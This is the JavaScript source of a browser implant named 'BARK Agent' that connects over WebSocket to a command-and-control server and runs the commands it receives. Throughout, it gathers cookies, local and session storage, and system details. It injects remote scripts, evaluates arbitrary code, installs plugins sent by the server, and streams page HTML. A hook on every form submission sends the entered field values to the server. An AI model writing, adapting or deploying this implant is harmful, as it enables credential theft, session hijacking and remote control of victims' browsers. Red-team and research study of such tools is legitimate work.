(function() {
    console.log("BARK Agent activated");
    
    // Command registry to store all available commands
    const CommandRegistry = {
        modules: {},
        
        // Register a module with its commands
        registerModule: function(moduleName, moduleHandlers) {
            this.modules[moduleName] = moduleHandlers;
        },
        
        // Execute a command from a specific module
        executeCommand: function(moduleName, commandName, params) {
            if (!this.modules[moduleName]) {
                return { error: `Unknown module: ${moduleName}` };
            }
            
            if (!this.modules[moduleName][commandName]) {
                return { error: `Unknown command '${commandName}' in module '${moduleName}'` };
            }
            
            try {
                return this.modules[moduleName][commandName](params);
            } catch (error) {
                return { error: error.toString() };
            }
        },
        
        // Get all registered modules and their commands
        getRegisteredCommands: function() {
            const result = {};
            Object.keys(this.modules).forEach(moduleName => {
                result[moduleName] = Object.keys(this.modules[moduleName]);
            });
            return result;
        }
    };
    
    // Logger utility
    const Logger = {
        debug: function(message, data) {
            const isDebug = true; // Set to false to disable verbose logging
            if (isDebug) {
                if (data) {
                    console.log(`[BARK Agent Debug] ${message}`, data);
                } else {
                    console.log(`[BARK Agent Debug] ${message}`);
                }
            }
        },
        
        log: function(message) {
            console.log(`[BARK Agent] ${message}`);
        },
        
        error: function(message, error) {
            if (error) {
                console.error(`[BARK Agent] ${message}`, error);
            } else {
                console.error(`[BARK Agent] ${message}`);
            }
        }
    };
    
    // Utils for common functionality
    const Utils = {
        // Generate unique agent ID
        generateAgentId: function() {
            const timestamp = Date.now().toString(36);
            const randomStr = Math.random().toString(36).substring(2, 10);
            return `agent_${timestamp}_${randomStr}`;
        },
        
        // Get browser and system information
        getSystemInfo: function() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                currentUrl: window.location.href,
                hostname: window.location.hostname,
                localStorageAvailable: !!window.localStorage
            };
        },
        
        // Get cookies
        getCookies: function() {
            try {
                return document.cookie.split(';')
                    .map(cookie => cookie.trim().split('='))
                    .reduce((obj, [key, value]) => {
                        if (key) obj[key] = value;
                        return obj;
                    }, {});
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        // Get localStorage content
        getLocalStorage: function() {
            try {
                if (!window.localStorage) return { error: "LocalStorage not available" };
                
                const storage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            } catch (e) {
                return { error: e.toString() };
            }
        }
    };
    
    // Define command modules
    
    // Recon module commands
    const ReconModule = {
        browser_info: function(params) {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }))
            };
        },
        
        capture_cookies: function(params) {
            return Utils.getCookies();
        },
        
        screen_info: function(params) {
            return {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
                devicePixelRatio: window.devicePixelRatio
            };
        },
        
        location_info: function(params) {
            return {
                url: window.location.href,
                host: window.location.host,
                protocol: window.location.protocol,
                path: window.location.pathname,
                query: window.location.search,
                hash: window.location.hash,
                referrer: document.referrer
            };
        }
    };
    
    // DOM manipulation commands
    const DomModule = {
        get_element: function(params) {
            if (params.length < 1) return { error: "Selector required" };
            const selector = params[0];
            const element = document.querySelector(selector);
            if (!element) return { error: "Element not found" };
            
            return {
                tagName: element.tagName,
                id: element.id,
                className: element.className,
                textContent: element.textContent.substring(0, 200) // Limit text length
            };
        },
        
        get_elements: function(params) {
            if (params.length < 1) return { error: "Selector required" };
            const allSelector = params[0];
            const elements = Array.from(document.querySelectorAll(allSelector));
            
            return elements.map(el => ({
                tagName: el.tagName,
                id: el.id,
                className: el.className,
                textContent: el.textContent.substring(0, 50) // Limit text length
            })).slice(0, 20); // Limit to 20 results
        },
        
        inject_script: function(params) {
            if (params.length < 1) return { error: "Script URL required" };
            const scriptUrl = params[0];
            
            return new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = scriptUrl;
                script.onload = () => resolve({ success: true });
                script.onerror = () => reject({ error: "Script failed to load" });
                document.head.appendChild(script);
            });
        }
    };
    
    // Storage commands
    const StorageModule = {
        get_local_storage: function(params) {
            return Utils.getLocalStorage();
        },
        
        get_session_storage: function(params) {
            try {
                if (!window.sessionStorage) return { error: "SessionStorage not available" };
                
                const storage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    storage[key] = sessionStorage.getItem(key);
                }
                return storage;
            } catch (e) {
                return { error: e.toString() };
            }
        },
        
        set_local_storage: function(params) {
            if (params.length < 2) return { error: "Key and value required" };
            try {
                localStorage.setItem(params[0], params[1]);
                return { success: true };
            } catch (e) {
                return { error: e.toString() };
            }
        }
    };
    
    // Network commands
    const NetworkModule = {
        fetch: function(params) {
            if (params.length < 1) return { error: "URL required" };
            const url = params[0];
            
            return new Promise((resolve, reject) => {
                fetch(url)
                    .then(response => response.text())
                    .then(data => resolve({ 
                        success: true, 
                        data: data.substring(0, 1000) // Limit response size
                    }))
                    .catch(error => reject({ error: error.toString() }));
            });
        },
        
        websocket_info: function(params) {
            return {
                connected: BARK_AGENT.socket && BARK_AGENT.socket.readyState === WebSocket.OPEN,
                readyState: BARK_AGENT.socket ? BARK_AGENT.socket.readyState : null,
                url: BARK_AGENT.config.serverUrl
            };
        }
    };
    
    // Exec module for JavaScript execution
    const ExecModule = {
        eval: function(params) {
            if (params.length < 1) return { error: "Code required" };
            try {
                // Join all params and evaluate as JavaScript
                const code = params.join('.');
                const result = eval(code);
                return result;
            } catch (e) {
                return { error: e.toString() };
            }
        }
    };
    
    // Register all modules
    CommandRegistry.registerModule("recon", ReconModule);
    CommandRegistry.registerModule("dom", DomModule);
    CommandRegistry.registerModule("storage", StorageModule);
    CommandRegistry.registerModule("net", NetworkModule);
    CommandRegistry.registerModule("exec", ExecModule);
    
    // Plugin system - allows adding new modules/commands at runtime
    const PluginSystem = {
        registerPlugin: function(pluginName, moduleDefinitions) {
            Logger.log(`Loading plugin: ${pluginName}`);
            
            // Register each module from the plugin
            Object.keys(moduleDefinitions).forEach(moduleName => {
                // Check if module exists - either extend or create new
                if (CommandRegistry.modules[moduleName]) {
                    // Extend existing module with new commands
                    Object.assign(CommandRegistry.modules[moduleName], moduleDefinitions[moduleName]);
                    Logger.debug(`Extended module: ${moduleName}`);
                } else {
                    // Register new module
                    CommandRegistry.registerModule(moduleName, moduleDefinitions[moduleName]);
                    Logger.debug(`Registered new module: ${moduleName}`);
                }
            });
            
            return true;
        }
    };
    
    // Main agent object
    const BARK_AGENT = {
        version: "1337",
        agentId: null,
        socket: null,
        config: {
            // Use WebSocket protocol matching the page's protocol (ws or wss)
            serverUrl: window.location.protocol === 'https:' ? 'wss:' : 'ws:' + '//localhost:8080/ws',
            heartbeatInterval: 5000, // 5 seconds
            reconnectInterval: 30000, // 30 seconds
            maxReconnectAttempts: 5
        },
        
        // Initialize the agent
        init: function() {
            Logger.log("Agent initializing...");
            this.agentId = "__BARK_AGENT_ID__";
            this.connectToC2();
            this.installHooks();
        },
        
        // Connect to C2 server
        connectToC2: function(reconnectAttempt = 0) {
            Logger.log("Establishing connection to C2...");
            
            try {
                this.socket = new WebSocket(this.config.serverUrl);
                
                // Connection opened
                this.socket.addEventListener('open', (event) => {
                    Logger.log("Connection established with C2 server");
                    
                    // Send agent activation message
                    this.sendMessage({
                        type: "agent_activation",
                        agentId: this.agentId,
                        version: this.version,
                        timestamp: new Date().toISOString(),
                        systemInfo: Utils.getSystemInfo(),
                        capabilities: CommandRegistry.getRegisteredCommands()
                    });
                    
                    // Start heartbeat after successful connection
                    this.startHeartbeat();
                });
                
                // Listen for messages
                this.socket.addEventListener('message', (event) => {
                    Logger.debug("Raw message received", event.data);
                    this.handleServerMessage(event);
                });
                
                // Handle errors
                this.socket.addEventListener('error', (event) => {
                    Logger.error("WebSocket error:", event);
                });
                
                // Handle connection close
                this.socket.addEventListener('close', (event) => {
                    Logger.log(`Connection closed: ${event.code} ${event.reason}`);
                    
                    // Cleanup heartbeat
                    if (this.heartbeatTimer) {
                        clearInterval(this.heartbeatTimer);
                        this.heartbeatTimer = null;
                    }
                    
                    // Attempt to reconnect if this wasn't a normal closure
                    if (event.code !== 1000 && reconnectAttempt < this.config.maxReconnectAttempts) {
                        const nextAttempt = reconnectAttempt + 1;
                        Logger.log(`Attempting to reconnect (${nextAttempt}/${this.config.maxReconnectAttempts}) in ${this.config.reconnectInterval/1000} seconds...`);
                        
                        setTimeout(() => {
                            this.connectToC2(nextAttempt);
                        }, this.config.reconnectInterval);
                    }
                });
            } catch (error) {
                Logger.error("Failed to connect to C2 server:", error);
            }
        },
        
        // Send message to C2 server
        sendMessage: function(message) {
            if (this.socket && this.socket.readyState === WebSocket.OPEN) {
                try {
                    this.socket.send(JSON.stringify(message));
                    return true;
                } catch (error) {
                    Logger.error("Error sending message:", error);
                    return false;
                }
            }
            return false;
        },
        
        // Handle incoming messages from server
        handleServerMessage: function(event) {
            try {
                const message = JSON.parse(event.data);
                Logger.log(`Received message type: ${message.type}`);
                
                switch (message.type) {
                    case "command":
                        Logger.log(`Command received: ${message.command}`);
                        
                        // Make sure the command structure exists
                        if (message.command && message.command.id && message.command.action) {
                            this.executeCommand(message.command);
                        } else {
                            Logger.error("Invalid command structure:", message.command);
                        }
                        break;
                    case "config_update":
                        this.updateConfig(message.config);
                        break;
                    case "pong":
                        // Simple acknowledgment of heartbeat
                        Logger.log("Received pong from server");
                        break;
                    case "plugin_install":
                        // Handle plugin installation
                        if (message.plugin && message.plugin.name && message.plugin.code) {
                            this.installPlugin(message.plugin);
                        }
                        break;
                    default:
                        Logger.log(`Unhandled message type: ${message.type}`);
                }
            } catch (error) {
                Logger.error("Error processing message:", error);
                Logger.debug("Raw data:", event.data);
            }
        },

        // Install a plugin
        installPlugin: function(plugin) {
            try {
                Logger.log(`Attempting to install plugin: ${plugin.name}`);
                
                // Create a safe function to execute the plugin code
                const pluginFunction = new Function('registerPlugin', plugin.code);
                
                // Execute the plugin code with the plugin registration function
                pluginFunction((pluginName, moduleDefinitions) => {
                    return PluginSystem.registerPlugin(pluginName, moduleDefinitions);
                });
                
                Logger.log(`Plugin ${plugin.name} installed successfully`);
                
                // Notify server about successful plugin installation
                this.sendMessage({
                    type: "plugin_installed",
                    agentId: this.agentId,
                    pluginName: plugin.name,
                    timestamp: new Date().toISOString(),
                    success: true
                });
                
                return true;
            } catch (error) {
                Logger.error(`Failed to install plugin ${plugin.name}:`, error);
                
                // Notify server about failed plugin installation
                this.sendMessage({
                    type: "plugin_installed",
                    agentId: this.agentId,
                    pluginName: plugin.name,
                    timestamp: new Date().toISOString(),
                    success: false,
                    error: error.toString()
                });
                
                return false;
            }
        },
        
        // Execute commands from the server
        executeCommand: function(command) {
            if (!command || !command.action) {
                Logger.error("Invalid command received");
                return;
            }
            
            Logger.log(`Executing command: ${command.action}`);
            
            try {
                let result = null;
                let success = false;
                
                // Handle basic ping command
                if (command.action === "ping") {
                    result = "Pong";
                    success = true;
                } 
                // Handle get_capabilities command
                else if (command.action === "get_capabilities") {
                    result = CommandRegistry.getRegisteredCommands();
                    success = true;
                }
                // Handle module-based commands
                else {
                    // Parse command structure using module.command.params format
                    const parts = command.action.split('.');
                    const moduleName = parts[0];
                    const commandName = parts[1];
                    const params = parts.length > 2 ? parts.slice(2) : [];
                    
                    // Execute the command through the registry
                    result = CommandRegistry.executeCommand(moduleName, commandName, params);
                    success = !result.error;
                }
                
                // Send result back to C2
                this.sendMessage({
                    type: "command_result",
                    agentId: this.agentId,
                    commandId: command.id,
                    timestamp: new Date().toISOString(),
                    result: result,
                    success: success
                });
                
            } catch (error) {
                Logger.error("Command execution error:", error);
                
                // Send error back to C2
                this.sendMessage({
                    type: "command_result",
                    agentId: this.agentId,
                    commandId: command.id,
                    timestamp: new Date().toISOString(),
                    result: { error: error.toString() },
                    success: false
                });
            }
        },
        
        // Update agent configuration
        updateConfig: function(newConfig) {
            if (!newConfig) return;
            
            // Update config properties
            Object.keys(newConfig).forEach(key => {
                if (this.config.hasOwnProperty(key)) {
                    this.config[key] = newConfig[key];
                }
            });
            
            Logger.log("Configuration updated");
            
            // Restart heartbeat with new interval if it changed
            if (newConfig.heartbeatInterval && this.heartbeatTimer) {
                this.startHeartbeat();
            }
        },
        
        // Start heartbeat mechanism
        heartbeatTimer: null,
        startHeartbeat: function() {
            // Clear existing heartbeat if any
            if (this.heartbeatTimer) {
                clearInterval(this.heartbeatTimer);
            }
            
            // Start new heartbeat interval
            this.heartbeatTimer = setInterval(() => {
                this.sendMessage({
                    type: "heartbeat",
                    agentId: this.agentId,
                    timestamp: new Date().toISOString()
                });
            }, this.config.heartbeatInterval);
        },
        
        // Install hooks for form submissions, etc.
        installHooks: function() {
            try {
                // Monitor form submissions
                document.addEventListener('submit', (e) => {
                    const formData = {};
                    const elements = e.target.elements;
                    
                    for (let i = 0; i < elements.length; i++) {
                        const element = elements[i];
                        if (element.name && element.value) {
                            formData[element.name] = element.value;
                        }
                    }
                    
                    this.sendMessage({
                        type: "form_submission",
                        agentId: this.agentId,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        formData: formData
                    });
                });
                
                Logger.log("Hooks installed");
            } catch (error) {
                Logger.error("Error installing hooks:", error);
            }
        }
    };
    
    // Example of how to add a plugin at runtime:
    /*
    PluginSystem.registerPlugin("screenshotPlugin", {
        "screenshot": {
            "capture": function(params) {
                // Code to capture screenshot
                return { message: "Screenshot captured" };
            }
        }
    });
    */

    PluginSystem.registerPlugin("remoteViewPlugin", {
        "remote_view": {
            "start": function(params) {
                try {
                    // Default to 5 seconds if no interval specified
                    const interval = params && params.length > 0 ? parseInt(params[0], 10) || 5000 : 5000;
                    
                    // Clear existing timer if there is one
                    if (window._barkRemoteViewTimer) {
                        clearInterval(window._barkRemoteViewTimer);
                    }
                    
                    // Track command ID for responses - will be filled by executeCommand
                    window._barkRemoteViewCommandId = null;
                    
                    // Store this outside the plugin for access in the interval
                    window._barkRemoteViewAgent = BARK_AGENT;
                    
                    // Start the remote view interval
                    window._barkRemoteViewTimer = setInterval(() => {
                        const currentHTML = document.documentElement.outerHTML;
                        const currentURL = window.location.href;
                        const currentTitle = document.title;
                        
                        // Make sure we have access to the BARK_AGENT
                        if (window._barkRemoteViewAgent) {
                            window._barkRemoteViewAgent.sendMessage({
                                type: "remote_view_result",
                                agentId: window._barkRemoteViewAgent.agentId,
                                commandId: window._barkRemoteViewCommandId || "remote_view_" + Date.now(),
                                timestamp: new Date().toISOString(),
                                result: {
                                    html: currentHTML.substring(0, 50000), // Limit size to avoid message issues
                                    url: currentURL,
                                    title: currentTitle,
                                    timestamp: new Date().toISOString()
                                },
                                success: true
                            });
                        }
                    }, interval);
                    
                    return {
                        success: true,
                        message: `Remote view started with interval: ${interval}ms`
                    };
                } catch (e) {
                    return { 
                        error: e.toString(),
                        message: "Failed to start remote view" 
                    };
                }
            },
            
            "stop": function(params) {
                try {
                    if (window._barkRemoteViewTimer) {
                        clearInterval(window._barkRemoteViewTimer);
                        window._barkRemoteViewTimer = null;
                        window._barkRemoteViewCommandId = null;
                        
                        return {
                            success: true,
                            message: "Remote view stopped"
                        };
                    } else {
                        return {
                            success: false,
                            message: "Remote view was not active"
                        };
                    }
                } catch (e) {
                    return { 
                        error: e.toString(),
                        message: "Error stopping remote view" 
                    };
                }
            },
            
            // Add a simplified version that just returns the current page content once
            "capture": function(params) {
                try {
                    return {
                        type: "remote_view_result",
                        success: true,
                        title: document.title,
                        url: window.location.href,
                        html: document.documentElement.outerHTML.substring(0, 100000) // Limit size
                    };
                } catch (e) {
                    return { error: e.toString() };
                }
            }
        }
    });
    
    // Initialize the agent
    BARK_AGENT.init();
})();